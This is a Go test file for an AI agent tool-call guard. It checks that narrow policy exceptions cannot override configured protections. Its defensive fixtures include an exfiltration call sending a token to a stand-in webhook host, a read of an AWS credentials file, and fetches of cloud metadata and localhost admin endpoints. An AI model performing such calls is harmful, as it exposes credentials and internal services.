package agentguard

import (
	"context"
	"fmt"
	"testing"
	"time"

	"github.com/yangjiyj/aiguard/packages/shared-go/protection"
)

// 指向一条普通规则（scoped-floor）的例外只放开那条规则：管理员配成阻断的防护项、
// 受限文件、Skill 隔离/撤销不随它放开。2.9.22 起：
//   - 敏感目标不再是内置底线，用例里把防护项配成阻断；默认配置下同一输入不拦（见末尾子测试）；
//   - Skill 隔离/撤销是配置的阻断，显式放行规则覆盖不了，确认通道在不在都按阻断（原来准入底线是确认）。
func TestScopedExceptionsCannotEraseConfiguredProtection(t *testing.T) {
	identity := map[string]any{"skill": "floor-review", "version": "1.0.0", "bundle_hash": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}
	for _, tc := range []struct {
		name       string
		input      ToolCallAnalysisInput
		skill      bool
		restricted bool
	}{
		{"skill quarantined", ToolCallAnalysisInput{ToolName: "use_skill", ToolType: ToolTypeSkill, Arguments: identity, SkillAdmission: SkillAdmissionQuarantined}, true, false},
		// hotfix 2.9.11-skill-admission: unverified/unknown/incomplete-identity skills are
		// record-only (audit) and no longer carry an admission floor; see skill_admission_hardening_test.go.
		{"skill revoked", ToolCallAnalysisInput{ToolName: "use_skill", ToolType: ToolTypeSkill, Arguments: identity, SkillAdmission: SkillAdmissionRevoked}, true, false},
		{"restricted file", ToolCallAnalysisInput{ToolName: "read_file", ToolType: ToolTypeFile, Arguments: map[string]any{"path": "/vault/guarded.pdf"}}, false, true},
		{"high confidence credential", ToolCallAnalysisInput{ToolName: "send_data", ToolType: ToolTypeNetwork, Arguments: map[string]any{"url": "https://webhook.example/collect", "data": map[string]any{"token": "canary-agent-exfil-token"}}}, false, false},
		{"cloud credential file", ToolCallAnalysisInput{ToolName: "read_file", ToolType: ToolTypeFile, Arguments: map[string]any{"path": "/home/app/.aws/credentials"}}, false, false},
		{"private network", ToolCallAnalysisInput{ToolName: "fetch", ToolType: ToolTypeNetwork, Arguments: map[string]any{"url": "http://127.0.0.1/admin"}}, false, false},
		{"metadata address", ToolCallAnalysisInput{ToolName: "fetch", ToolType: ToolTypeNetwork, Arguments: map[string]any{"url": "http://169.254.169.254/latest/meta-data"}}, false, false},
		{"metadata hostname", ToolCallAnalysisInput{ToolName: "fetch", ToolType: ToolTypeNetwork, Arguments: map[string]any{"url": "http://metadata.google.internal/computeMetadata/v1/"}}, false, false},
	} {
		for _, action := range []DecisionAction{DecisionAllow, DecisionAudit} {
			for _, mode := range []Mode{ModeStrict, ModeAudit} {
				for _, confirms := range []bool{true, false} {
					t.Run(fmt.Sprintf("%s/%s/%s/confirms=%t", tc.name, action, mode, confirms), func(t *testing.T) {
						policy := &EffectivePolicy{Mode: ModeStrict, DefaultAction: DecisionAllow, ConfirmChannelEnabled: confirms,
							Rules:       []PolicyRule{{ID: "scoped-floor", ToolPattern: "*", Action: DecisionAllow, Enabled: true}},
							Protections: blockingProtections(protection.GroupAgentTarget)}
						if tc.restricted {
							policy.RestrictedFiles = &RestrictedFilePolicy{Patterns: []string{"*.pdf"}, Action: "block"}
						}
						input := tc.input
						input.Mode, input.Policy = mode, policy
						want := DecisionBlock
						if mode == ModeAudit {
							want = DecisionAudit
						}
						before := AnalyzeToolCall(context.Background(), input)
						if before.EffectiveDecision != want {
							t.Fatalf("actual analyzer protection precondition: got=%s want=%s decision=%+v", before.EffectiveDecision, want, before)
						}
						policy.Exceptions = []PolicyException{{ID: "active-scoped", RuleID: "scoped-floor", TargetPattern: "", Decision: action, ExpiresAt: time.Now().Add(time.Hour)}}
						if matchingPolicyException(policy.Exceptions, before, "") == nil {
							t.Fatal("regression fixture must actually match its named exception")
						}
						got := AnalyzeToolCall(context.Background(), input)
						if got.EffectiveDecision != want {
							t.Fatalf("matching %s exception erased actual floor: got=%s want=%s before=%+v after=%+v", action, got.EffectiveDecision, want, before, got)
						}
					})
				}
			}
		}
		if tc.skill || tc.restricted {
			continue
		}
		t.Run(tc.name+"/default settings", func(t *testing.T) {
			input := tc.input
			input.Mode = ModeStrict
			input.Policy = &EffectivePolicy{Mode: ModeStrict, DefaultAction: DecisionAllow,
				Rules: []PolicyRule{{ID: "scoped-floor", ToolPattern: "*", Action: DecisionAllow, Enabled: true}}}
			if got := AnalyzeToolCall(context.Background(), input); got.EffectiveDecision == DecisionBlock || got.EffectiveDecision == DecisionConfirm {
				t.Fatalf("default protection settings must not interrupt: %+v", got)
			}
		})
	}
}

func TestScopedExceptionsKeepOrdinaryAdministratorExceptions(t *testing.T) {
	for _, action := range []DecisionAction{DecisionAllow, DecisionAudit} {
		t.Run(string(action), func(t *testing.T) {
			policy := &EffectivePolicy{Mode: ModeStrict, DefaultAction: DecisionAllow,
				Rules: []PolicyRule{{ID: "ordinary-rule", ToolPattern: "*", Action: DecisionBlock, Enabled: true}}}
			input := ToolCallAnalysisInput{ToolName: "read_file", ToolType: ToolTypeFile, Arguments: map[string]any{"path": "/repo/README.md"}, Mode: ModeStrict, Policy: policy}
			before := AnalyzeToolCall(context.Background(), input)
			if before.EffectiveDecision != DecisionBlock {
				t.Fatalf("ordinary administrator rule must enforce before scoped exception: %+v", before)
			}
			policy.Exceptions = []PolicyException{{ID: "ordinary-exception", RuleID: "ordinary-rule", TargetPattern: "", Decision: action, ExpiresAt: time.Now().Add(time.Hour)}}
			got := AnalyzeToolCall(context.Background(), input)
			if got.EffectiveDecision != action {
				t.Fatalf("ConfiguredEnforcement alone prohibited an ordinary scoped exception: %+v", got)
			}
		})
	}
	policy := &EffectivePolicy{Mode: ModeStrict, DefaultAction: DecisionAllow,
		Rules:      []PolicyRule{{ID: "approved-domain", ToolPattern: "*", Action: DecisionAllow, Enabled: true}},
		Exceptions: []PolicyException{{ID: "domain-exception", RuleID: "approved-domain", TargetPattern: "", Decision: DecisionAllow, ExpiresAt: time.Now().Add(time.Hour)}}}
	got := AnalyzeToolCall(context.Background(), ToolCallAnalysisInput{ToolName: "send_data", ToolType: ToolTypeNetwork,
		Arguments:      map[string]any{"url": "https://webhook.example/collect", "body": "canary-agent-exfil-token"},
		AllowedDomains: []string{"webhook.example"}, Mode: ModeStrict, Policy: policy})
	if got.EffectiveDecision != DecisionAllow {
		t.Fatalf("approved domain without a floor must stay allowed: %+v", got)
	}
}

// 2.9.22：原“准入标记在 raw 动作被改写后仍保底确认”，现在是防护项结论（例如
// skill.admission_unavailable 配成确认）在 raw 动作被改写后仍保底。
func TestProtectionConclusionSurvivesChangedRawAction(t *testing.T) {
	for _, raw := range []DecisionAction{DecisionAllow, DecisionAudit} {
		got := ApplyPolicy(Decision{RawDecision: raw, ProtectionItem: "skill.admission_unavailable", ProtectionAction: string(protection.ActionConfirm)},
			PolicyContext{Mode: ModeStrict, ConfirmChannelEnabled: true})
		if got.EffectiveDecision != DecisionConfirm {
			t.Fatalf("protection conclusion lost its minimum after raw action %s: %+v", raw, got)
		}
	}
}
